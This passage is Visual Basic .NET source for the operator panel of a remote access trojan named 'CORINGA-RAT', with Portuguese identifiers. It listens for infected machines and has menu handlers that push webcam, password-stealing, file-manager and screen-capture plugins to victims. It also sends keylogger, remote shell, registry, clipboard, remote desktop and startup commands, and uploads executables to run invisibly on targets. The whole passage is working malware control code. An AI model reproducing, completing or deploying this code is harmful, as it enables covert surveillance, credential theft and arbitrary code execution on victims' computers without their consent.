            LVListInfoO.Items.Item(10).ForeColor = My.Settings.SeleCor

            L1.GridLines = My.Settings.SeleGridLins
        Catch ex As Exception

        End Try


        Try
            If File.Exists(IMG11) Then
                Using bmp1 = New Bitmap(L1.ClientSize.Width, L1.ClientSize.Height)
                    Using g1 = Graphics.FromImage(bmp1)
                        g1.DrawImage(Image.FromFile(IMG11), 0, 0, bmp1.Width, bmp1.Height)
                        L1.BackgroundImage = bmp1.Clone
                    End Using
                End Using
            End If
        Catch ex As Exception

        End Try

        Try
            If File.Exists(IMG22) Then
                Dim img As Image
                Dim img2 As Bitmap
                img = Image.FromFile(IMG22)
                img2 = New Bitmap(img)
                img.Dispose()
                CM.BackgroundImage = img2
            End If
        Catch ex As Exception

        End Try

        Try
            If My.Settings.MostrarInformações = True Then
                CKMostrarInformações.Checked = True
            Else
                CKMostrarInformações.Checked = False
            End If
        Catch ex As Exception

        End Try

        Try
            If My.Settings.MostrarDesktop = True Then
                CKMostrarDesktop.Checked = True
            Else
                CKMostrarDesktop.Checked = False
            End If
        Catch ex As Exception

        End Try

        MdSokserver.F = Me
        Me.Show()

        Dim str As String
        For Each str In Directory.GetFiles((Application.StartupPath & "\plugin\"), "*.dll")
            Dim item As New plg(New FileInfo(str).Name.ToLower)
            MdSokserver.Plug.Add(item)
        Next
        Dim str2 As String
        For Each str2 In Strings.Split("cam.dll,ch.dll,fm.dll,pw.dll,sc2.dll", ",", -1, CompareMethod.Binary)
            If (MdSokserver.GETPLG(str2, Nothing) Is Nothing) Then
                MsgBox(("Missing dll >> " & str2), MsgBoxStyle.ApplicationModal, Nothing)
            End If
        Next

VerificarDeNNovo:

        If MdFN.GetValueReg("Porta (Conexão)") = Nothing Then
            Dim TextReturned As String = ""
            Dim aAE As New FrmPortas
            If aAE.ShowDialog("Conexão (Port)", "Port.", "8000", TextReturned, False) = Windows.Forms.DialogResult.OK Then
                Try
                    port = Conversions.ToInteger(aAE.NDPorta.Value)
                    S = New MdSK(Conversions.ToInteger(aAE.NDPorta.Value))
                    lbPorts.Text = "Aguardando Conexão nas Portas : " & aAE.NDPorta.Value
                Catch ex As Exception
                    MsgBox("ESTA PORTA JA ESTA EM EXECUÇÃO", MsgBoxStyle.Critical, "Informações")
                    GoTo VerificarDeNNovo
                End Try
            Else
                End
            End If
        Else
            Dim TextReturned As String = ""
            Dim aAE As New FrmPortas
            If aAE.ShowDialog("Conexão (Port)", "Port.", MdFN.GetValueReg("Porta (Conexão)"), TextReturned, False) = Windows.Forms.DialogResult.OK Then
                Try
                    port = Conversions.ToInteger(aAE.NDPorta.Value)
                    S = New MdSK(Conversions.ToInteger(aAE.NDPorta.Value))
                    lbPorts.Text = "Aguardando Conexão nas Portas : " & aAE.NDPorta.Value
                Catch ex As Exception
                    MsgBox("ESTA PORTA JA ESTA EM EXECUÇÃO", MsgBoxStyle.Critical, "Informações")
                    GoTo VerificarDeNNovo
                End Try
            Else
                End
            End If
        End If

        MdSokserver.W = S

        Dim aa As New Thread(New ThreadStart(AddressOf dsk))
        aa.Start()
        Timer1.Enabled = True

    End Sub

    Private Sub WebcamToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles WebcamToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = MdSokserver.GETPLG("cam.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    MdSokserver.SendPlug(DirectCast(current.Tag, MdClient), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub CMDToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CMDToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"rss"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub RegeditToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RegeditToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                If (MdSokserver.Gform(Conversions.ToString(Operators.ConcatenateObject("reg", NewLateBinding.LateGet(current.Tag, Nothing, "ip", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))) Is Nothing) Then
                    Dim reg As New FrmRegedit
                    reg.Name = Conversions.ToString(Operators.ConcatenateObject("reg", NewLateBinding.LateGet(current.Tag, Nothing, "ip", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))
                    reg.sk = DirectCast(current.Tag, MdClient)
                    reg.Text = Conversions.ToString(MdSokserver.vno(reg.sk.L))
                    reg.Show()
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub KeyloggerToolStripMenuItem_Click_1(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {"kl"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub


    Private Sub SenhasToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SenhasToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = MdSokserver.GETPLG("pw.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    MdSokserver.SendPlug(DirectCast(current.Tag, MdClient), p, True)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub FragsToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FragsToolStripMenuItem1.Click
        FragsToolStripMenuItem1.Enabled = False
        DesktopToolStripMenuItem1.Enabled = True
        L1.SmallImageList = IMG2
        L1.LargeImageList = IMG2
        Dim items As ListViewItemCollection = L1.Items
        SyncLock items
            Dim enumerator As IEnumerator = Nothing
            Try
                enumerator = L1.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ImageKey = (current.SubItems.Item(MdSokserver.hco).Text & ".png")
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End SyncLock
        L1.FX()
    End Sub

    Private Sub DesktopToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles DesktopToolStripMenuItem1.Click
        FragsToolStripMenuItem1.Enabled = True
        DesktopToolStripMenuItem1.Enabled = False
        Dim box As PictureBox = PicMineDesktop
        SyncLock box
            CEL = Nothing
        End SyncLock

        L1.SmallImageList = IMG
        L1.LargeImageList = IMG
        IMG.Images.Clear()
        Dim size As New Size(27, 24)
        IMG.ImageSize = size
        IMG.Images.Add("s", My.Resources._59)
        Dim items As ListViewItemCollection = L1.Items
        SyncLock items
            Dim enumerator As IEnumerator = Nothing
            Try
                enumerator = L1.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ImageKey = "s"
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End SyncLock
        L1.FX()
    End Sub

    Private Sub ServidorNormalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ServidorNormalToolStripMenuItem.Click
        FrmServidor.Show()
    End Sub

    Private Sub PesonalizaçãoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PesonalizaçãoToolStripMenuItem.Click
        FrmPesonalizaçao.Show()
    End Sub

    Private Sub CréditosToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CréditosToolStripMenuItem.Click
        FrmCreditos.Show()
    End Sub

    Private Sub DesativarBarraDeTarefasToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles DesativarBarraDeTarefasToolStripMenuItem1.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {"EsconderBarraDeTarefas"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub AtivarBarraDeTarefasToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles AtivarBarraDeTarefasToolStripMenuItem1.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {"MostrarBarraDeTarefas"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub


    Private Sub OFFToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OFFToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {"MonitorOFF"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ONToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ONToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {"MonitorON"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub


    Private Sub SustoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SustoToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"PermisaoFrmTerrror"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub


    Private Sub ExecutarNormalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecutarNormalToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim FT As New OpenFileDialog
            FT.Title = "CORINGA-RAT"
            FT.Multiselect = False
            FT.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            FT.Filter = "TODOS ARQUIVOS (*.*)|*.*"
            FT.FileName = Nothing

            If (FT.ShowDialog = DialogResult.OK) Then
                Dim cM As Boolean = True
                Dim buffer As Byte() = MdFN.SB(Convert.ToBase64String(MdFN.ZIP(File.ReadAllBytes(FT.FileName), cM)))
                Dim stream As New MemoryStream
                Dim s As String = ("rn" & MdSokserver.Y & New FileInfo(FT.FileName).Extension & MdSokserver.Y)
                stream.Write(MdFN.SB(s), 0, s.Length)
                stream.Write(buffer, 0, buffer.Length)
                Dim aa As New Thread(New ParameterizedThreadStart(AddressOf MdSokserver.SendTo), 1)
                aa.Start(New Object() {L1.SelectedItems, stream.ToArray, Color.Green})
            End If
        End If
    End Sub


    Private Sub ExecutarInvisívelToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecutarInvisívelToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim FT As New OpenFileDialog
            FT.Title = "CORINGA-RAT"
            FT.Multiselect = False
            FT.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            FT.Filter = "ARQUIVOS (*.exe)|*.exe"
            FT.FileName = Nothing

            If (FT.ShowDialog = DialogResult.OK) Then
                Dim cM As Boolean = True
                Dim buffer As Byte() = MdFN.SB(Convert.ToBase64String(MdFN.ZIP(File.ReadAllBytes(FT.FileName), cM)))
                Dim stream As New MemoryStream
                Dim s As String = ("ExecutarInvisivel" & MdSokserver.Y & New FileInfo(FT.FileName).Extension & MdSokserver.Y)
                stream.Write(MdFN.SB(s), 0, s.Length)
                stream.Write(buffer, 0, buffer.Length)
                Dim aa As New Thread(New ParameterizedThreadStart(AddressOf MdSokserver.SendTo), 1)
                aa.Start(New Object() {L1.SelectedItems, stream.ToArray, Color.Green})
            End If
        End If
    End Sub

    Private Sub TrocarBackgroundDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TrocarBackgroundDesktopToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim dialog As New OpenFileDialog
            dialog.Title = "ARQUIVOS IMAGENS"
            dialog.Multiselect = False
            dialog.Filter = "IMAGENS (*.*)|*.*"
            dialog.FileName = ""
            If (dialog.ShowDialog = DialogResult.OK) Then
                Dim cM As Boolean = True
                Dim buffer As Byte() = MdFN.SB(Convert.ToBase64String(MdFN.ZIP(File.ReadAllBytes(dialog.FileName), cM)))
                Dim stream As New MemoryStream
                Dim s As String = ("TrocaaWallpaper" & MdSokserver.Y & New FileInfo(dialog.FileName).Extension & MdSokserver.Y)
                stream.Write(MdFN.SB(s), 0, s.Length)
                stream.Write(buffer, 0, buffer.Length)
                Dim aa As New Thread(New ParameterizedThreadStart(AddressOf MdSokserver.SendTo), 1)
                aa.Start(New Object() {L1.SelectedItems, stream.ToArray, Color.Green})
            End If
        End If
    End Sub

    Private Sub PicMineDesktop_Click(sender As Object, e As EventArgs) Handles PicMineDesktop.Click
        If (Not CEL Is Nothing) Then
            CEL.Send(String.Concat(New String() {"CAP", MdSokserver.Y, Conversions.ToString(PicMineDesktop.Width), MdSokserver.Y, Conversions.ToString(PicMineDesktop.Height)}))
        End If
    End Sub

    Private Sub CToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"EnviarServidorChamaFormClipboard"}, Nothing, Nothing, Nothing, True) 'ERA "rss"
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub InformaçõesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InformaçõesToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"EnviarPermisaoDeInfomacaoParaServidor"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub Monitor02ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Monitor02ToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = MdSokserver.GETPLG("sc2.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    MdSokserver.SendPlug(DirectCast(current.Tag, MdClient), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    'REMOTE DESKTOP
    Private Sub Monitor01ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Monitor01ToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"EnviarDesktooopp"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub



    Private Sub GerenciadorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GerenciadorToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"EnviarPermisaoGerenciador"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub


    Private Sub ProgramasInstaladosToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ProgramasInstaladosToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"PrimsaoFormProgramas"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub CKMostrarDesktop_CheckedChanged(sender As Object, e As EventArgs) Handles CKMostrarDesktop.CheckedChanged
        Try
            If CKMostrarDesktop.Checked Then
                My.Settings.MostrarDesktop = True
                My.Settings.Save()
            Else
                My.Settings.MostrarDesktop = False
                My.Settings.Save()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub CKMostrarInformações_CheckedChanged(sender As Object, e As EventArgs) Handles CKMostrarInformações.CheckedChanged
        Try
            If CKMostrarInformações.Checked Then
                My.Settings.MostrarInformações = True
                My.Settings.Save()
            Else
                My.Settings.MostrarInformações = False
                My.Settings.Save()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ListarJanelasToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ListarJanelasToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"PermisaoGJanelas"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ListarPortasAtivasToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ListarPortasAtivasToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"Permisaoconesaosss"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ListarServiçosToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ListarServiçosToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"PermisaopServiços"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub EnviarMensagemToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EnviarMensagemToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"EnviarPermisaaaoMensagem"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub StartUpManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartUpManagerToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"PermisaoStartUpp"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub AvançadoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AvançadoToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = MdSokserver.GETPLG("fm.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    MdSokserver.SendPlug(DirectCast(current.Tag, MdClient), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub


    Private Sub BasicoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BasicoToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"PermisaoGerenciadorMineee"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ProcessToolStripMenuItem.Click
        FrmCriarAntiProcess.Show()
    End Sub

    Private Sub SkypeMessengerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SkypeMessengerToolStripMenuItem.Click
        MsgBox("ESTA OPÇÃO NÃO ESTA DISPONIVEL AGUARDE UMA ATUALIZAÇÃO", MsgBoxStyle.Exclamation, "Informações") : Exit Sub

        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"PermisaoSkypeForm"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem4.Click
        FrmCreditos.Show()
    End Sub

    Private Sub ConfiguraçõesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ConfiguraçõesToolStripMenuItem.Click
        FrmPesonalizaçao.TabControl1.SelectedTab = FrmPesonalizaçao.TBNotificacao
        FrmPesonalizaçao.Show()
    End Sub

    Private Sub FromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromLinkToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"PermissaoFrmURL"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    
End Class
